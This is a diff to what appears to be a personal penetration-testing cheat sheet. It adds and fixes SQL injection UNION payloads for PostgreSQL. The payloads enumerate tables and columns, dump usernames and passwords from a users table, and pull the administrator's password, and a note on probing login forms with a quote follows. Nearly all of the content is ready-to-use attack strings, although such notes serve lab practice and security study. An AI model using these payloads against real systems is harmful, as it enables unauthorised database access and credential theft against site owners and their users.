@@ -159,8 +159,9 @@ sudo openvpn nmap -sV {target IP}
 - {'+union+select+version(),NULL--} --POSTGRE db version check in URL
 - {'+union+select+table_name,NULL+from+information_schema.tables--} -- PSTGRE table_names
 - {'+union+select+column_name,NULL+from+information_schema.columns+where+table_name='users'--} --PSTGRE users column
-- {'+union+select+username,NULL+from+users} -- select username table
-- {'+union+select+password,NULL+from+users} -- select password 
+- {'+union+select+username,NULL+from+users--} -- select username table
+- {'+union+select+password,NULL+from+users--} -- select password 
+- {'+union+select+password,NULL+from+users+where+username='administrator'--} --select password belonging to a specific user
 
 
 [+] test login with {'} if internal error shows then it allows SQLi
